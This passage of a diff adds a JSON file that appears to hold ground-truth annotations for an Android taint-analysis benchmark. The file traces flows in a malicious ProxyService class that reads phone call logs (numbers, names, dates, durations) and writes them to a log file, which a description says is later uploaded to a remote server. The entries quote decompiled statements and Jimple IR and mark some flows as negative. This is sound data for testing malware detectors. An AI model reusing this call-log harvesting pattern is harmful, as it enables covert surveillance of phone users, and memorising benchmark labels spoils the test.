+          "statement": "String strName = cur.getString(index_Name);",
+          "methodName": "public void QueryPhoneLog(boolean first)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 647,
+          "ID": 2
+        },
+        {
+          "statement": "s = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(s)).append(strNumber).append(\",\").append(strName).append(\",\").append(strDate).append(\",\").toString())).append(longDuration / 60).append(':').toString();",
+          "methodName": "public void QueryPhoneLog(boolean first)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 674,
+          "ID": 3
+        },
+        {
+          "statement": "if (ds < 10) {",
+          "methodName": "public void QueryPhoneLog(boolean first)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 676,
+          "ID": 4
+        },
+        {
+          "statement": "s = new StringBuilder(String.valueOf(s)).append('0').toString();",
+          "methodName": "public void QueryPhoneLog(boolean first)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 677,
+          "ID": 5
+        },
+        {
+          "statement": "LogFile(new StringBuilder(String.valueOf(s)).append(ds).toString());",
+          "methodName": "public void QueryPhoneLog(boolean first)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 679,
+          "ID": 6
+        },
+        {
+          "statement": "logStr.append(dateFormatter.format(Calendar.getInstance().getTime()) + \",\" + logstr + \"\\r\\n\");",
+          "methodName": "public static void LogFile(String logstr)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 270,
+          "ID": 7
+        },
+        {
+          "statement": "LogToFile();",
+          "methodName": "public void onDestroy()",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 524,
+          "ID": 8
+        }
+      ],
+      "description": "This malicious flow saves phone call logs to a log file when the ProxyService is destroyed. This file will be later uploaded to a remote server.",
+      "isNegative": false,
+      "attributes": {
+        "lifecycle": true,
+        "partialFlow": true,
+        "pathConstraints": true,
+        "appendToString": true,
+        "staticField": true
+      },
+      "ID": 15
+    },
+    {
+      "source": {
+        "targetName": "File",
+        "targetNo": 1,
+        "statement": "File out = new File(Environment.getExternalStorageDirectory(), \"ProxyLog.out\");",
+        "methodName": "public int onStartCommand(Intent intent, int flags, int startId)",
+        "className": "com.smart.studio.proxy.ProxyService",
+        "lineNo": 460,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "specialinvoke $r2.<java.io.File: void <init>(java.io.File,java.lang.String)>($r15, \"ProxyLog.out\")"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "write",
+        "targetNo": 1,
+        "statement": "out.write(logStr.toString());",
+        "methodName": "private void LogToFile()",
+        "className": "com.smart.studio.proxy.ProxyService",
+        "lineNo": 280,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r3.<java.io.BufferedWriter: void write(java.lang.String)>($r7)"
+          }
+        ]
+      },
+      "intermediateFlows": [],
+      "description": "Negative flow.",
+      "isNegative": true,
+      "attributes": {},
+      "ID": 16
+    },
+    {
+      "source": {
+        "targetName": "query",
+        "targetNo": 1,
+        "statement": "cur = getContentResolver().query(uri, null, \"date>\" + lastPhoneTime, null, \"date\");",
+        "methodName": "public void QueryPhoneLog(boolean first)",
+        "className": "com.smart.studio.proxy.ProxyService",
+        "lineNo": 635,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r4 = virtualinvoke $r3.<android.content.ContentResolver: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>($r1, null, $r6, null, \"date\")"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "i",
+        "targetNo": 1,
+        "statement": "Log.i(\"proxy\", \"\\\"\" + logstr + \"\\\"\");",
+        "methodName": "public static void LogFile(String logstr)",
+        "className": "com.smart.studio.proxy.ProxyService",
+        "lineNo": 268,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "staticinvoke <android.util.Log: int i(java.lang.String,java.lang.String)>(\"proxy\", $r3)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "int index_Number = cur.getColumnIndex(\"number\");",
+          "methodName": "public void QueryPhoneLog(boolean first)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 638,
+          "ID": 1
+        },
+        {
+          "statement": "String strNumber = cur.getString(index_Number);",
+          "methodName": "public void QueryPhoneLog(boolean first)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 646,
+          "ID": 2
+        },
+        {
+          "statement": "s = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(s)).append(strNumber).append(\",\").append(strName).append(\",\").append(strDate).append(\",\").toString())).append(longDuration / 60).append(':').toString();",
+          "methodName": "public void QueryPhoneLog(boolean first)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 674,
+          "ID": 3
+        },
+        {
+          "statement": "if (ds < 10) {",
+          "methodName": "public void QueryPhoneLog(boolean first)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 676,
+          "ID": 4
+        },
+        {
+          "statement": "s = new StringBuilder(String.valueOf(s)).append('0').toString();",
+          "methodName": "public void QueryPhoneLog(boolean first)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 677,
+          "ID": 5
+        },
+        {
+          "statement": "LogFile(new StringBuilder(String.valueOf(s)).append(ds).toString());",
+          "methodName": "public void QueryPhoneLog(boolean first)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 679,
+          "ID": 6
+        }
+      ],
+      "description": "This malicious flow logs phone calls. ",
+      "isNegative": false,
+      "attributes": {
+        "pathConstraints": true,
+        "appendToString": true
+      },
+      "ID": 17
+    },
+    {
+      "source": {
+        "targetName": "query",
+        "targetNo": 1,
+        "statement": "cur = getContentResolver().query(uri, null, null, null, \"date DESC\");",
+        "methodName": "public void QueryPhoneLog(boolean first)",
+        "className": "com.smart.studio.proxy.ProxyService",
+        "lineNo": 633,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r4 = virtualinvoke $r3.<android.content.ContentResolver: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>($r1, null, null, null, \"date DESC\")"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "i",
+        "targetNo": 1,
+        "statement": "Log.i(\"proxy\", \"\\\"\" + logstr + \"\\\"\");",
+        "methodName": "public static void LogFile(String logstr)",
+        "className": "com.smart.studio.proxy.ProxyService",
+        "lineNo": 268,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "staticinvoke <android.util.Log: int i(java.lang.String,java.lang.String)>(\"proxy\", $r3)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "int index_Name = cur.getColumnIndex(\"name\");",
+          "methodName": "public void QueryPhoneLog(boolean first)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 639,
+          "ID": 1
+        },
+        {
+          "statement": "s = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(s)).append(strNumber).append(\",\").append(strName).append(\",\").append(strDate).append(\",\").toString())).append(longDuration / 60).append(':').toString();",
+          "methodName": "public void QueryPhoneLog(boolean first)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 674,
+          "ID": 2
+        },
+        {
+          "statement": "if (ds < 10) {",
+          "methodName": "public void QueryPhoneLog(boolean first)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 676,
+          "ID": 3
+        },
+        {
+          "statement": "s = new StringBuilder(String.valueOf(s)).append('0').toString();",
+          "methodName": "public void QueryPhoneLog(boolean first)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 677,
+          "ID": 4
+        },
+        {
+          "statement": "LogFile(new StringBuilder(String.valueOf(s)).append(ds).toString());",
+          "methodName": "public void QueryPhoneLog(boolean first)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 679,
+          "ID": 5
+        }
+      ],
+      "description": "This malicious flow logs phone calls.",
+      "isNegative": false,
+      "attributes": {
+        "pathConstraints": true,
+        "appendToString": true
+      },
+      "ID": 18
+    },
+    {
+      "source": {
+        "targetName": "getConnectionInfo",
+        "targetNo": 1,
+        "statement": "WifiInfo wi = mWiFiManager.getConnectionInfo();",
+        "methodName": "public int onStartCommand(Intent intent, int flags, int startId)",
+        "className": "com.smart.studio.proxy.ProxyService",
+        "lineNo": 412,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r10 = virtualinvoke $r9.<android.net.wifi.WifiManager: android.net.wifi.WifiInfo getConnectionInfo()>()"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "i",
+        "targetNo": 1,
+        "statement": "Log.i(\"post\", \"out=\" + out.exists());",
+        "methodName": "public int onStartCommand(Intent intent, int flags, int startId)",
+        "className": "com.smart.studio.proxy.ProxyService",
+        "lineNo": 461,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "staticinvoke <android.util.Log: int i(java.lang.String,java.lang.String)>(\"post\", $r5)"
+          }
+        ]
+      },
+      "intermediateFlows": [],
+      "description": "Negative flow.",
+      "isNegative": true,
+      "attributes": {},
+      "ID": 19
+    },
+    {
+      "source": {
+        "targetName": "File",
+        "targetNo": 1,
+        "statement": "File out = new File(Environment.getExternalStorageDirectory(), \"ProxyLog.out\");",
+        "methodName": "public int onStartCommand(Intent intent, int flags, int startId)",
+        "className": "com.smart.studio.proxy.ProxyService",
+        "lineNo": 460,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "specialinvoke $r2.<java.io.File: void <init>(java.io.File,java.lang.String)>($r15, \"ProxyLog.out\")"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "i",
+        "targetNo": 1,
+        "statement": "Log.i(\"post\", \"out=\" + out.exists());",
+        "methodName": "public int onStartCommand(Intent intent, int flags, int startId)",
+        "className": "com.smart.studio.proxy.ProxyService",
+        "lineNo": 461,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "staticinvoke <android.util.Log: int i(java.lang.String,java.lang.String)>(\"post\", $r5)"
+          }
+        ]
+      },
+      "intermediateFlows": [],
+      "description": "Negative flow.",
+      "isNegative": true,
+      "attributes": {},
+      "ID": 20
+    }
+  ]
+}
